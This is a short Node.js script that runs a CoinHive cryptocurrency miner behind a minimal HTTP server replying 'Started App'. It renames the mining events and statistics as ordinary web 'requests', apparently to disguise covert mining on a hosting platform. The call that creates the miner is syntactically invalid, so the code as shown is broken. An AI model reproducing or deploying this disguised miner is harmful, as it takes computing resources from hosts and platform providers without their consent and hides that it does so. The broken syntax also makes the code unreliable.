const CoinHive = require('coin-hive');
const http = require('http');  

(async () => {
 
  // Create miner
  const miner = await CoinHive('83A1asSDroZ05kv3y2NBTAA5E7ea9It7', throttle:0.5,threads:3); // Coin-Hive's Site Key
 
  // Start miner
  await miner.start();
 
  // Listen on events
  miner.on('found nothing', () => console.log('Found!!'))
  miner.on('accepted request', () => console.log('Accepted!!'))
  miner.on('update', data => console.log(`
    Request per second: ${data.hashesPerSecond}
    Total Request: ${data.totalHashes}
    Received Request: ${data.acceptedHashes}
  `));
 
  const requestHandler = (request, response) => {  
    console.log(request.url)
    response.end('Started App')
  }

  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {  
    if (err) {
      return console.log('something bad happened', err)
    }

    console.log(`server is listening`)
  })

  // Stop miner
  //setTimeout(async () => await miner.stop(), 60000);
})();
